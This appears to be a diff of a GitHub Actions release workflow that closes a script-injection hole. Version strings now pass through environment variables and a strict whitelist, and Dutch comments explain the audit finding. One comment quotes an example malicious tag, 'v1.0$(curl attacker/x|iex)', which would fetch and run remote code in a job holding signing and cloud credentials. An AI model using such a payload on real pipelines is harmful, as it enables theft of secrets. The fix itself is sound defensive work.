@@ -109,19 +109,59 @@ jobs:
 
       - name: Get version
         id: get-version
+        env:
+          # Bevinding O1. Een tagnaam en een dispatch-input zijn vrije tekst;
+          # een `${{ }}` daarvan wordt LETTERLIJK in het script geplakt vóór de
+          # shell start, dus `v1.0$(...)` voert uit. Alles gaat via env.
+          # `GITHUB_EVENT_NAME`/`GITHUB_REF` zetten we hier bewust NIET: die zijn
+          # al aanwezig in de runner en de `GITHUB_`-prefix is gereserveerd.
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "version=${{ github.event.inputs.version }}" >> $GITHUB_OUTPUT
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="${INPUT_VERSION:-}"
           else
-            echo "version=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+            VERSION="${GITHUB_REF#refs/tags/}"
           fi
+          # Whitelist die de hele injectieklasse sluit: deze waarde stroomt door
+          # naar een github-script-stap én naar het pwsh-script in de job met de
+          # signing-secrets. Twee controles, en ze zijn allebei nodig:
+          #
+          #  1. Tekenset op de HELE waarde. `case` matcht altijd de volledige
+          #     string, dus dit sluit ook een NIEUWE REGEL uit. Zonder deze stap
+          #     glipt "v1.2.3\nv9.9.9" door de regex hieronder (grep matcht per
+          #     regel) en schrijft de dispatch-input daarna een tweede regel in
+          #     $GITHUB_OUTPUT — een output-injectie. Een git-tag kan geen
+          #     nieuwe regel bevatten, een dispatch-input wél.
+          #  2. Structuur. Na stap 1 bestaat de waarde uitsluitend uit 'v',
+          #     cijfers en punten op één regel, dus is de regex sluitend.
+          #
+          # Na deze poort bevat $VERSION gegarandeerd geen teken dat in een
+          # shell, in pwsh of in JS iets betekent. (Dat het óók echte CalVer is,
+          # bewaakt de gate hierboven via de vergelijking met package.json.)
+          case "$VERSION" in
+            *[!v0-9.]*|'')
+              echo "::error::Versie bevat tekens buiten 'v', cijfers en punten (of is leeg)." >&2
+              exit 1
+              ;;
+          esac
+          if ! printf '%s' "$VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::Versie '$VERSION' heeft niet de vorm vX.Y.Z." >&2
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
 
       - name: Create release
         id: create-release
         uses: actions/github-script@v8
+        env:
+          # Bevinding O1: `'${{ ... }}'` in een script-blok breekt al op een
+          # enkele quote en plakt daarna vrije tekst als JS-broncode. Via env +
+          # process.env — hetzelfde patroon als publish-release hieronder.
+          VERSION: ${{ steps.get-version.outputs.version }}
         with:
           script: |
-            const version = '${{ steps.get-version.outputs.version }}';
+            const version = process.env.VERSION;
             const { data } = await github.rest.repos.createRelease({
               owner: context.repo.owner,
               repo: context.repo.repo,
@@ -246,10 +286,18 @@ jobs:
         shell: pwsh
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Bevinding O1, en dit was de scherpste van de zes: pwsh evalueert
+          # `$(...)` BINNEN een double-quoted string, dus een tagnaam
+          # `v1.0$(curl attacker/x|iex)` voerde uit in precies de job die de
+          # Tauri-signing-sleutel en alle Azure-credentials in zijn env heeft.
+          # Via env leest pwsh de waarde als data, niet als broncode. De
+          # CalVer-whitelist in create-release sluit de klasse aan de bron.
+          VERSION: ${{ needs.create-release.outputs.version }}
+          REPO: ${{ github.repository }}
         run: |
           $ErrorActionPreference = 'Stop'
-          $VERSION = "${{ needs.create-release.outputs.version }}"
-          $REPO = "${{ github.repository }}"
+          $VERSION = $env:VERSION
+          $REPO = $env:REPO
           $NSIS_DIR = "$env:GITHUB_WORKSPACE/src-tauri/target/release/bundle/nsis"
 
           # --- Diagnostics: dump the nsis bundle dir so a future failure shows
